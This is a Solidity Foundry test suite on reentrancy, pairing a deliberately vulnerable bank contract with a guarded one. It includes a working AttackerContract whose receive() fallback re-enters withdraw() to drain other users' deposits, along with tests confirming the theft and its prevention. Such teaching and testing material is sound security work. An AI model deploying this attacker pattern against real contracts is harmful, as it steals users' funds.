// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import {Test, console} from "forge-std/Test.sol";
import {VulnerableBank} from "src/reentrancy/VulnerableBank.sol";
import {SecureBank} from "src/reentrancy/SecureBank.sol";

/// @title AttackerContract - Demonstrates reentrancy attack
/// @notice This contract exploits the reentrancy vulnerability in VulnerableBank
contract AttackerContract {
    VulnerableBank public vulnerableBank;
    uint256 public attackCount;
    uint256 public maxAttacks = 5;

    constructor(address _vulnerableBankAddress) {
        vulnerableBank = VulnerableBank(_vulnerableBankAddress);
    }

    /// @notice Deposit funds to start the attack
    function depositToBank() external payable {
        vulnerableBank.deposit{value: msg.value}();
    }

    /// @notice Execute the reentrancy attack
    function attack() external {
        attackCount = 0;
        vulnerableBank.withdraw();
    }

    /// @notice Fallback function that re-enters the vulnerable contract
    receive() external payable {
        if (attackCount < maxAttacks && address(vulnerableBank).balance > 0) {
            attackCount++;
            console.log("Reentrancy attack #", attackCount);
            console.log("Draining:", msg.value);
            vulnerableBank.withdraw();
        }
    }

    /// @notice Check the attacker's balance
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

/// @title ReentrancyExploit Test Suite
/// @notice Comprehensive tests demonstrating reentrancy vulnerabilities and protections
contract ReentrancyExploitTest is Test {
    VulnerableBank public vulnerableBank;
    SecureBank public secureBank;
    AttackerContract public attacker;

    address public user1 = makeAddr("user1");
    address public user2 = makeAddr("user2");
    address public user3 = makeAddr("user3");

    uint256 constant INITIAL_DEPOSIT = 1 ether;

    function setUp() public {
        // Deploy contracts
        vulnerableBank = new VulnerableBank();
        secureBank = new SecureBank();
        attacker = new AttackerContract(address(vulnerableBank));

        // Give users some ether
        vm.deal(user1, 10 ether);
        vm.deal(user2, 10 ether);
        vm.deal(user3, 10 ether);
        vm.deal(address(attacker), 5 ether);
    }

    /// @notice Test normal deposit and withdrawal functionality
    function test_NormalDepositWithdraw() public {
        vm.startPrank(user1);

        // Deposit ether
        vulnerableBank.deposit{value: INITIAL_DEPOSIT}();
        assertEq(vulnerableBank.getBalance(user1), INITIAL_DEPOSIT);
        assertEq(vulnerableBank.getContractBalance(), INITIAL_DEPOSIT);

        // Withdraw ether
        uint256 balanceBefore = user1.balance;
        vulnerableBank.withdraw();

        assertEq(vulnerableBank.getBalance(user1), 0);
        assertEq(user1.balance, balanceBefore + INITIAL_DEPOSIT);

        vm.stopPrank();
    }

    /// @notice Test successful reentrancy attack on vulnerable contract
    function test_ReentrancyAttackSuccess() public {
        // Setup: Users deposit funds
        vm.prank(user1);
        vulnerableBank.deposit{value: 2 ether}();

        vm.prank(user2);
        vulnerableBank.deposit{value: 3 ether}();

        // Attacker deposits small amount
        attacker.depositToBank{value: 1 ether}();

        console.log("=== Before Attack ===");
        console.log("Bank balance:", vulnerableBank.getContractBalance());
        console.log("Attacker balance:", attacker.getBalance());

        // Execute attack
        attacker.attack();

        console.log("=== After Attack ===");
        console.log("Bank balance:", vulnerableBank.getContractBalance());
        console.log("Attacker balance:", attacker.getBalance());

        // Verify attack success - attacker drained more than their deposit
        assertTrue(attacker.getBalance() > 1 ether, "Attack should steal funds");
        assertTrue(vulnerableBank.getContractBalance() < 5 ether, "Bank should be drained");
    }

    /// @notice Test that legitimate users can't withdraw after attack
    function test_UsersCannotWithdrawAfterAttack() public {
        // Setup: Users deposit funds
        vm.prank(user1);
        vulnerableBank.deposit{value: 2 ether}();

        vm.prank(user2);
        vulnerableBank.deposit{value: 3 ether}();

        // Attack
        attacker.depositToBank{value: 1 ether}();
        attacker.attack();

        // Users try to withdraw - should fail due to insufficient contract balance
        vm.prank(user1);
        vm.expectRevert("Transfer failed");
        vulnerableBank.withdraw();
    }

    /// @notice Test that secure bank prevents reentrancy attack
    function test_SecureBankPreventsReentrancy() public {
        // Deploy attacker targeting secure bank (will fail)
        SecureBankAttacker secureAttacker = new SecureBankAttacker(address(secureBank));
        vm.deal(address(secureAttacker), 5 ether);

        // Setup: Users deposit to secure bank
        vm.prank(user1);
        secureBank.deposit{value: 2 ether}();

        // Attacker deposits
        secureAttacker.depositToBank{value: 1 ether}();

        console.log("=== Before Attack on Secure Bank ===");
        console.log("Secure bank balance:", secureBank.getContractBalance());
        console.log("Attacker balance:", secureAttacker.getBalance());

        // Attack should fail
        vm.expectRevert("Transfer failed");
        secureAttacker.attack();

        // Verify bank is protected - attack failed entirely
        assertEq(secureBank.getContractBalance(), 3 ether); // All deposits remain
        assertEq(secureAttacker.getBalance(), 5 ether); // Original balance unchanged
    }

    /// @notice Test secure bank normal operations
    function test_SecureBankNormalOperations() public {
        vm.startPrank(user1);

        // Deposit and withdraw normally
        secureBank.deposit{value: INITIAL_DEPOSIT}();
        assertEq(secureBank.getBalance(user1), INITIAL_DEPOSIT);

        uint256 balanceBefore = user1.balance;
        secureBank.withdraw();

        assertEq(secureBank.getBalance(user1), 0);
        assertEq(user1.balance, balanceBefore + INITIAL_DEPOSIT);

        vm.stopPrank();
    }

    /// @notice Fuzz test: Multiple users deposit and withdraw random amounts
    function testFuzz_MultipleUsersRandomAmounts(uint96 amount1, uint96 amount2, uint96 amount3) public {
        vm.assume(amount1 > 0 && amount1 <= 5 ether);
        vm.assume(amount2 > 0 && amount2 <= 5 ether);
        vm.assume(amount3 > 0 && amount3 <= 5 ether);

        // Use secure bank for fuzz testing
        vm.deal(user1, amount1);
        vm.deal(user2, amount2);
        vm.deal(user3, amount3);

        // Users deposit
        vm.prank(user1);
        secureBank.deposit{value: amount1}();

        vm.prank(user2);
        secureBank.deposit{value: amount2}();

        vm.prank(user3);
        secureBank.deposit{value: amount3}();

        uint256 totalDeposited = amount1 + amount2 + amount3;
        assertEq(secureBank.getContractBalance(), totalDeposited);

        // Users withdraw
        vm.prank(user1);
        secureBank.withdraw();

        vm.prank(user2);
        secureBank.withdraw();

        vm.prank(user3);
        secureBank.withdraw();

        assertEq(secureBank.getContractBalance(), 0);
    }

    /// @notice Test gas usage comparison
    function test_GasUsageComparison() public {
        vm.startPrank(user1);

        // Test vulnerable bank withdrawal gas
        vulnerableBank.deposit{value: 1 ether}();
        uint256 gasStart = gasleft();
        vulnerableBank.withdraw();
        uint256 vulnerableGas = gasStart - gasleft();

        // Test secure bank withdrawal gas
        secureBank.deposit{value: 1 ether}();
        gasStart = gasleft();
        secureBank.withdraw();
        uint256 secureGas = gasStart - gasleft();

        console.log("Vulnerable bank gas:", vulnerableGas);
        console.log("Secure bank gas:", secureGas);

        // Secure bank should use more gas due to reentrancy protection
        assertTrue(secureGas > vulnerableGas, "Secure bank should use more gas");

        vm.stopPrank();
    }
}

/// @title SecureBankAttacker - Attempts to attack SecureBank (will fail)
contract SecureBankAttacker {
    SecureBank public secureBank;

    constructor(address _secureBankAddress) {
        secureBank = SecureBank(_secureBankAddress);
    }

    function depositToBank() external payable {
        secureBank.deposit{value: msg.value}();
    }

    function attack() external {
        secureBank.withdraw();
    }

    receive() external payable {
        // This will fail due to ReentrancyGuard
        secureBank.withdraw();
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
